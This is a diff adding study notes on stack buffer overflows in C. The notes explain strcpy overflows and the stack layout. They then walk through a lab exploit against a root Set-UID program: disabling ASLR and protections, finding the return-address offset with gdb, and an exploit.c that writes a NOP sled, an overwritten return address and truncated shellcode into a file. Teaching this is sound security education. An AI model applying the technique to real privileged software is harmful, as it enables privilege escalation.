@@ -14,4 +14,198 @@
             - If a program with such vulerability is running with 
             privileges, then attacker will be able to gain those 
             privileges.
+    - Copy data to buffer
+        - functions used to copy data to buffer
+            strcpy(), strcat(), memcpy(), ...
+        - example
+            #include <stdio.h>
+            #include <string.h>
+
+            void main() {
+                char src[40] = "Hello \0 World";
+                char dest[40];
+
+                strcpy(dest, src);
+            }
+            - The above only copies "Hello " to dest.
+            - Why? Because strcpy() stops copy only when it encounters
+            the terminating character '\0'
+        - What happens if the src buffer is longer than dest buffer
+            - The strcpy() doesnt stop until it finds terminating 
+            character.
+            - Since the source string is longer than buffer, strcpy() 
+            will overwrite some portion of the stack.
+        - Consider the following
+            #include <string.h>
+
+            void foo(char *str)
+            {
+                char buffer[12];
+                strcpy(buffer, str);
+            }
+
+            int main()
+            {
+                char *str = "This is definitely longer than 12";
+                foo(str);
+
+                return 1;
+            }
+            - The strcpy() doesnot stop until it sees '\0'
+            - Since the source string is longer than 12
+                - strcpy() will overwrite some portion of the stack
+                above the buffer.
+            - This is called buffer overflow
+            - The stack grows from high to low address, 
+                - But buffer grows normal direction (i.e. low to high)
+                - Therfore, when we copy we copy from buffer[0] 
+                eventually to buffer[11]
+                - If there are still more data strcpy() will continue
+                copying data to the region above the buffer.
+            
+                (High Address)  +---------------------------+
+                                |                           |
+                                |                           |
+                                |                           |
+                                |---------------------------|
+                                |                           |
+                                |     Main Stack frame      |
+                                |                           |
+                                |---------------------------|   Stack   
+                                |   str (Pointer)           !   Grows
+                                |---------------------------|      |
+                                |   Return Address          |      |
+                                |---------------------------|      V
+                                |   Prev. Frame Pointer     |
+                                |---------------------------|           
+                                |   buffer[11]              |           ^
+                                |   .                       |           |
+                                |   .                       |           |
+                                |   buffer[0]               |        Buffer
+                                |---------------------------|        Grows
+                                |                           |
+                                |                           |
+                (Low Address)   +---------------------------+
+
+    - Exploiting Buffer overflow
+        - Consider the following.
+            /* stack.c */
+            #include <string.h>
+            #include <stdio.h>
+            #include <stdlib.h>
+
+            void foo(char *str)
+            {
+                char buffer[100];
+                strcpy(buffer, str);
+            }
+
+            int main()
+            {
+                char str[400];
+                FILE *badfile;
+
+                badfile = fopen("badfile", "r");
+                fread(str, sizeof(char), 300, badfile);
+                foo(str);
+
+                printf("Finished");
+                return 1;
+            }
+            - The program reads 300 byte from a file called badfile
+            - Then copies it to 100 byte buffer.
+            - Cleary there is buffer overflow.
+            - To overflow the pprogram and exploit we can write our
+            malicious code on the badfile
+        - Setup our experment
+            - Disable address randomization
+                sudo sysctl -w kernel.randomize_va_space=0
+            - Compile the above program using 
+                gcc -o stack -z execstack -fno-stack-protector stack.c
+                sudo chown root stack
+                sudo chmod 4755 stack
+        - Understand the behaviour
+            echo "aaa" > badfile
+            ./stack
+            > Finished
+
+            echo "aaa ..(100 characters omited)... aaa" > badfile
+            ./stack
+            Segmentation Fault (core dumped)
+
+            - The program will run with no problem when file is less than
+            100 bytes
+        - Finding the address without Guessing
+            - Since we have the copy of the victim program we can
+            examine the program using gdb.
+            - To do that run the program in debug mode
+                gcc -z execstack -fno-stack-protector -o -g sdbug stack.c 
+                - NB: when a privileged Set-UID program is debugged by 
+                normal user, the program will not run with privilege, so
+                directly changing the behaviour of the program inside
+                the debugger will not allow us to gain any privilege.
+
+                gdb -q sdbug
+                (gdb) break foo
+                Breakpoint 1 ....
+                (gdb) run
+                Starting program: /...
+
+                Breakpoint 1, foo (str=0xbffff117 "...") at stack.c
+
+                (gdb) p $ebp
+                $1 = (void *) 0xbffff188
+                (gdb) p &buffer
+                $2 = (char (*) [100]) 0xbffff11c
+                (gdb) p 0xbffff188 - 0xbffff11c
+                $3 = 108
+                (gdb) quit
+                - We can see that the value of the frame pointer is 
+                    0xbffff188
+                - There we can tell the return address is on
+                    0xbffff188 + 4
+                - The first address we can jump to is
+                    0xbffff188 + 8
         
+                +---------------------------------------------------------------+
+                | NOP | NOP | NOP | --- | RT | NOP | --- | NOP | Malicious Code |
+                +---------------------------------------------------------------+
+                ^ <---Distance = 112 ----> ^ ^  ^
+                |                          | |  +------------------------------+
+                |                          | +--------------+                  |
+            Start of the                Value placed        |               First
+            Buffer Once the input       here will         After the      Possible
+            is copied the memory        overwrite         Buffer copy       Entry
+            address will be             Return address    the address of
+            0xbffff11c                                    this position is
+                                                            0xbffff188 + 8
+        - Construct our exploit
+            - we make a program that will generate the malicious input
+            - And write the generated input to the badfile
+                /* exploit.c */
+                #include <stdlib.h>
+                #include <stdio.h>
+                #include <string.h>
+
+                char shellcode[] = 
+                    "\x31\xc0.........";
+                
+                void main(int argc, char **argv)
+                {
+                    char buffer[200];
+                    FILE *badfile;
+
+                    // Initialize the buffer with NOP
+                    memset(&buffer, 0x90, 200);
+
+                    // Fill the return address
+                    *((long *) (buffer+112)) = 0xbffff188 + 0x80;
+
+                    // Place the shellcode towards the end
+                    memcpy(buffer + sizeof(buffer) - sizeof(shellcode), 
+                        shellcode, sizeof(shellcode));
+                    
+                    badfile =  fopen("./badfile", "w");
+                    fwrite(buffer, 200, 1, badfile);
+                    fclose(badfile);
+                }
